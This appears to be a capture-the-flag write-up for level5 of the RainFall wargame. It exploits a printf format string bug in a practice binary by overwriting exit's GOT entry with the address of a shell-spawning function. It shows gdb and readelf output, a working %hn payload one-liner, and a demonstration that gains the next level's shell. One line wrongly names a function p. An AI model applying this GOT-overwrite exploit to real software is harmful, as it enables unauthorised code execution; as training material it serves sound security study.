## Static Analysis

After decompiling the binary with ghidra we get the pseudo code below: 

```
void o(void)
{
  system("/bin/sh");
                    /* WARNING: Subroutine does not return */
  _exit(1);
}

void n(void)
{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  printf(local_20c);
                    /* WARNING: Subroutine does not return */
  exit(1);
}

void main(void)
{
  n();
  return;
}
```

The binary contains three functions:
- `main`, which simply calls the `n` function.
- `n`, where the core logic is implemented. It uses the secure `fgets` function to read user input into a buffer, then calls the function `p` with that buffer. The return instruction is replaced by a call to `exit`, so overwriting the return address of `n` is not possible.
- `o`, which launches a shell. This function is not used in the standard execution flow and can only be identified by analyzing the ELF file in detail.


## Vulnerability found 

The printf function is vulnerable to a **format string exploit**. </br>
This vulnerability can be exploited to **read or write arbitrary memory**, and potentially execute malicious code. The issue arises from using unchecked user input directly as the format string parameter, which controls how the data is formatted and displayed. </br>
[exploit-101-format-strings](https://axcheron.github.io/exploit-101-format-strings/)

## Dynamic Analysis

As in previous exercises, we are dealing with a **format string vulnerability**, which allows us to read from or write to arbitrary memory addresses. This time, our goal is to call the `o` function that spawns a shell.

The address of `o` is `0x080484a4`:
```
> readelf -s level5
...
    67: 080484a4    30 FUNC    GLOBAL DEFAULT   13 o
...
``` 

As usual, we begin by determining the position of our input on the stack:
```
(gdb) r <<< $(python -c 'print "AAAA" + " %p"*5')
...
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520
```

We find that our input is at the **4**th position.

As mentioned in the static analysis, since the `exit` function is called instead of returning, overwriting the return address of `n` is useless. However, our attack surface is not limited to the stack or heap. If we have the right permissions, we can write elsewhere in the ELF memory layout.

One interesting zone is the **Global Offset Table (GOT)**, and more specifically, the `.got.plt` section — the **Procedure Linkage Table** portion of the GOT.
```
> readelf -S level5
...
  [12] .plt              PROGBITS        08048370 000370 000080 04  AX  0   0 16
...
  [22] .got              PROGBITS        08049814 000814 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        08049818 000818 000028 04  WA  0   0  4
...
```

Using tools like `readelf`, we can confirm that the `.got` and `.got.plt` sections have the `(WA)` flags — Writable and Allocatable — meaning they are writable during execution.

[More information on ELF sections](https://www.sco.com/developers/gabi/2003-12-17/ch4.sheader.html)

- The `.got.plt` section holds the resolved addresses of external functions (like those in **libc**), which is exactly what we are targeting.
- On the other hand, `.got` stores data pointers, typically for global variables.

When disassembling the `n` function, we see that the `call` instruction targets `exit@plt`:
```
(gdb)  disas n 
...
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>

(gdb) disas 0x80483d0 
...
   0x080483d0 <+0>:	jmp    *0x8049838
   0x080483d6 <+6>:	push   $0x28
   0x080483db <+11>:	jmp    0x8048370
```

Disassembling `exit@plt` reveals three instructions:

- The second and third instructions are part of dynamic symbol resolution, used by the dynamic linker. We won’t go into detail here.  [More info](https://www.segmentationfault.fr/linux/role-plt-got-ld-so/)

- The most important is the first instruction. This jumps to the address stored at `0x8049838`, which is an entry in `.got.plt`.

  - On the first call, this address redirects the execution flow back to the second instruction in the `.plt`, which handles symbol resolution.
```
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:	0x080483d6 (0x080483d6 <exit@plt+6>:	push   $0x28)
```
  - On subsequent calls, the symbol is already resolved and the address in `.got.plt` directly points to the actual function in memory. For example, if we observe the `.got` entry for `printf` after it has been resolved, we may see:
```
(gdb) disas 0x8048380  <--- printf@plt
Dump of assembler code for function printf@plt:
   0x08048380 <+0>:	jmp    *0x8049824
...
(gdb) x 0x8049824
0x8049824 <printf@got.plt>:	0xb7e78850
...
(gdb) info file
...
	0xb7e42f10 - 0xb7f7736c is .text in /lib/i386-linux-gnu/libc.so.6
...
(gdb) disas 0xb7e78850 
Dump of assembler code for function printf:
...
```

The address `0xb7e78850` points to the `printf` function in the `.text` section of `libc`.

So, to hijack a function call, we overwrite its entry in `.got.plt`.


## Payload construction 

In our case, we target the `.got.plt` entry for `exit`, located at `0x8049838`, and overwrite it with the address of `o (0x080484a4)`.
```
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:	0x080483d6 -> 0x080484a4 (o)
```

We observe that the default value is `0x080483d6`, and the high bytes are the same as `0x080484a4`. Since only the lower two bytes differ, we can use the `%hn` format specifier to write just those two bytes.
- We convert the last two bytes of `0x080484a4` to decimal: `0x84a4 = 33956`
- We subtract the 4 bytes already written for the address: `33956 - 4 = 33952`


Our payload will look like this (we also append a cat command to keep the shell alive):
```
(python -c 'print "\x38\x98\x04\x08" + "%33952X" + "%4$hn"'; cat)
```

## Demonstration 

```
level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "%33952X" + "%4$hn"'; cat) | ./level5
...

whoami 
level6
```

